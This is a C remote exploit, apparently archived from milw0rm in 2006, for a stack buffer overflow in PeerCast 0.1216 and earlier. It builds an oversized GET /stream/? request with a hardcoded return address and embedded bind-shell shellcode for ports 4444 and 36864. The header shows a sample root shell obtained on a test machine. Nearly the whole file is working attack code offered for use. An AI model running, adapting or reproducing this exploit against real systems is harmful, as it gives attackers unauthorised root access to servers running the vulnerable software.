/*
\		PeerCast <=0.1216 remote exploit
/			by Darkeagle
\	
/	09.03.06
\
/
\	gr33tz: bl4ck guys, unl0ck guys, rst/ghc guys, 0x557 guys, ph4nt0m guys, sh0k and many otherz.
/
\
/ http://unl0ck.net

*******************************************
root@localhost darkeagle]# telnet localhost 36864
Trying 127.0.0.1...
Connected to localhost (127.0.0.1).
Escape character is '^]'.
id;
uid=0(root) gid=0(root) groups=0(root)
: command not found
uname -a;
Linux localhost 2.6.3-7mdk #1 Wed Mar 17 15:56:42 CET 2004 i686 unknown unknown GNU/Linux
: command not found
*******************************************

Special tnx goes to: Dr_UF0 for targets support :)

\
/
\
*/

#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>


char scode[]= // binds 4444 port
"\x31\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x85"
"\x4f\xca\xdf\x83\xeb\xfc\xe2\xf4\xb4\x94\x99\x9c\xd6\x25\xc8\xb5"
"\xe3\x17\x53\x56\x64\x82\x4a\x49\xc6\x1d\xac\xb7\x94\x13\xac\x8c"
"\x0c\xae\xa0\xb9\xdd\x1f\x9b\x89\x0c\xae\x07\x5f\x35\x29\x1b\x3c"
"\x48\xcf\x98\x8d\xd3\x0c\x43\x3e\x35\x29\x07\x5f\x16\x25\xc8\x86"
"\x35\x70\x07\x5f\xcc\x36\x33\x6f\x8e\x1d\xa2\xf0\xaa\x3c\xa2\xb7"
"\xaa\x2d\xa3\xb1\x0c\xac\x98\x8c\x0c\xae\x07\x5f";

char linuxshellcode[]= // binds 36864 port
	"\xeb\x6e\x5e\x29\xc0\x89\x46\x10"
	"\x40\x89\xc3\x89\x46\x0c\x40\x89"	 
	"\x46\x08\x8d\x4e\x08\xb0\x66\xcd"
	"\x80\x43\xc6\x46\x10\x10\x88\x46"
	"\x08\x31\xc0\x31\xd2\x89\x46\x18"
	"\xb0\x90\x66\x89\x46\x16\x8d\x4e"
	"\x14\x89\x4e\x0c\x8d\x4e\x08\xb0"
	"\x66\xcd\x80\x89\x5e\x0c\x43\x43"
	"\xb0\x66\xcd\x80\x89\x56\x0c\x89"
	"\x56\x10\xb0\x66\x43\xcd\x80\x86"
	"\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0"
	"\x3f\x41\xcd\x80\xb0\x3f\x41\xcd"
	"\x80\x88\x56\x07\x89\x76\x0c\x87"
	"\xf3\x8d\x4b\x0c\xb0\x0b\xcd\x80"
	"\xe8\x8d\xff\xff\xff\x2f\x62\x69"
	"\x6e\x2f\x73\x68";



void usage(char *proga)
{
	printf("usage> %s <ipaddr> <port>\n", proga);
}

int main( int argc, char *argv[] )
{
int sock;
struct sockaddr_in addr;
char evil[1024], get[1024];

long retaddr = 0x438a3e3c; // mandrake 10.0 rus - peercast 0.1211.tgz


system("clear");
printf(".::: PeerCast <= 0.1215 remote exploit :::.\n");
printf("                 by Darkeagle              \n\n");
printf(" bug founder: Leon Juranic\n");
printf("\n keep private!!!\n");

if ( argc < 3 )
{
usage(argv[0]);
exit(0);
}

sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

addr.sin_family = AF_INET;
addr.sin_port = htons(atoi(argv[2]));
addr.sin_addr.s_addr = inet_addr(argv[1]);

printf("\nexp> connecting...\n");

if ( connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0 )
{
printf("exp> connection failed\n");
exit(0);
}

printf("exp> connection enstabilished!\n");

memset(evil, 0x00, 1024);
memset(get, 0x00, 1024);
memset(evil, 0x55, 800);
//memcpy(evil+strlen(evil), &scode, sizeof(scode));
memcpy(evil+strlen(evil), &linuxshellcode, sizeof(linuxshellcode));

strcpy(get, "GET /stream/?");

*(long*)&evil[780] = retaddr;
strcat(evil, "\r\n\r\n");
strcat(get, evil);

sleep(1);
printf("exp> sending evil data\n");
send(sock, get, strlen(get), 0);
printf("exp> done!\n");
printf("exp> check shell\n");
close(sock);
return 0;
}

// milw0rm.com [2006-03-12]